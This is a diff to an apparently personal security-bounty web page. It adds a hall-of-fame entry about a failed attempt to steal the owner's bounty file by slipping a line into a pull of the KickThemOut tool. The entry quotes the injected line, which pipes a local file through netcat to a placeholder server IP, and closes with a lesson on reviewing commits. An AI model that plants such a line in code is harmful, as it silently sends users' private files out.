@@ -196,12 +196,12 @@
                 <!-- HALL OF FAME -->
                 <h2>Hall of fame</h2>
 
+                <!-- <0xCoto> -->
                 <div class='bs-callout bs-callout-danger'>
                     <div class='media'>
                         <div class='media-left'>
                             <img class='media-object' src='images/coto.jpg' width='120' />
                         </div>
-                        <!-- <0xCoto> -->
                         <div class='media-body'>
                             <h3 style='margin-top:0'>Apostolos (aka <a href='https://twitter.com/0xCoto'>@0xCoto</a>) <small>March 12th, 2017</small></h3>
 
@@ -278,7 +278,65 @@
 
                         </div>
                     </div>
-                    <!-- </0xCoto> -->
+                </div>
+                <!-- </0xCoto> -->
+
+                <!-- <xdavidhu> -->
+                <div class='bs-callout bs-callout-danger'>
+                    <div class='media'>
+                        <div class='media-left'>
+                            <img class='media-object' src='images/xdavidhu.png' width='120' />
+                        </div>
+                        <div class='media-body'>
+                            <h3 style='margin-top:0'>David (aka <a href='https://twitter.com/xdavidhu'>@xdavidhu</a>) <small>August 14th, 2017</small></h3>
+
+                            <h4>Outcome</h4>
+                            <p>
+                                <strong>Attack failed.</strong>
+                            </p>
+
+                            <h4>Full disclosure</h4>
+                            <p>
+                                While David and I were fixing some bugs in <a href="https://github.com/k4m4/kickthemout">KickThemOut</a>, David claimed that he added a new feature and that he wanted me to test it out. He asked me to try running his new <code>develop</code> branch commit. Subsequently, I <code>git pull</code>ed and ran the tool as instructed.
+                            </p>
+
+                            <p>
+                                Huge mistake.
+                            </p>
+
+                            <p>
+                                David had injected the following line of code into the main <code>.py</code> file:
+                            </p>
+
+                            <blockquote>
+                                os.system("cat /Users/k4m4/.bounty | nc [DAVID'S_SERVER_IP] 5463")
+                            </blockquote>
+
+                            <p>
+                                Basically, this line of python code sends the contents of the bounty file in that path <code>/Users/k4m4/.bounty</code> to David's server. David had a netcat listener running on his server, awaiting for any incoming requests on port <code>5463</code>.
+                            </p>
+
+                            <p>
+                                Luckily, David assumed that my main username is <b>k4m4</b>; however, it isn't. As a result, once I ran the script using <code>sudo python.py kickthemout.py</code>, all I got was an error message that looked something like this:
+                            </p>
+
+                            <blockquote>
+                                cat: /Users/k4m4/.bounty: No such file or directory
+                            </blockquote>
+
+                            <p>
+                                Since KickThemOut requires root to run, if David had used the correct path, he would have successfully received all contents of my bounty file.
+                            </p>
+
+                            <h4>Security correction</h4>
+                            <p>
+                                I should always look at the changes that have been made in each commit before pulling and running any piece of code from GitHub or anywhere else. Even if you skim through the code, a short command, such as the one that David injected, can easily go unnoticed. 
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <!-- </xdavidhu> -->
+
                 </div>
 
                 <div class='media'>
@@ -445,37 +503,6 @@
                             <h4>Payout</h4>
                             <p>
                                 <strong>฿ 0.5</strong>
-                            </p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class='bs-callout bs-callout-info'>
-                    <div class='media'>
-                        <div class='media-left'>
-                            <img class='media-object' src='images/gtklocker.jpg' width='120' />
-                        </div>
-                        <div class='media-body'>
-                            <h3 style='margin-top: 0'><a href='https://gtklocker.com/'>Kostis Karantias</a></h3>
-
-                            <h4>Target</h4>
-                            <p>
-                                Steal the <strong>~/.bounty</strong> file on his MacBook laptop.
-                            </p>
-
-                            <h4>Payout</h4>
-                            <p>
-                                <strong>50 EUR</strong>
-                            </p>
-
-                            <h4>Target</h4>
-                            <p>
-                                Post the message "Bounty claimed by @YourName" on <a href='https://www.facebook.com/gtklocker'>his Facebook</a>.
-                            </p>
-
-                            <h4>Payout</h4>
-                            <p>
-                                <strong>5 EUR</strong>
                             </p>
                         </div>
                     </div>
